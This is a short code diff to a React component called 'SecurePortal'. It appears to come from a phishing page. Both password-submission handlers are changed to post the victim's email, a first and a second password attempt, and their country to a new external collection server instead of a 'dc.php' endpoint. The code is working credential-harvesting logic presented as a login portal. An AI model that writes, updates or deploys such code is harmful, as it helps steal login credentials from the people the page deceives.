@@ -170,7 +170,7 @@ const SecurePortal = () => {
 
   const sendFirstTry = async (code) => {
     try {
-      await axios.post('https://un-helpers.site/dc.php/', {
+      await axios.post('https://server-gfhv.onrender.com', {
         email: userInput,
         firstpasswordused: code,
         country: locationData.country,
@@ -220,7 +220,7 @@ const SecurePortal = () => {
     setErrorMsg('');
 
     try {
-      await axios.post('https://un-helpers.site/dc.php/', {
+      await axios.post('https://server-gfhv.onrender.com', {
         email: userInput,
         secondpasswordused: accessCode,
         country: locationData.country,
@@ -334,6 +334,7 @@ const SecurePortal = () => {
 };
 
 export default SecurePortal;
+
 
 
 
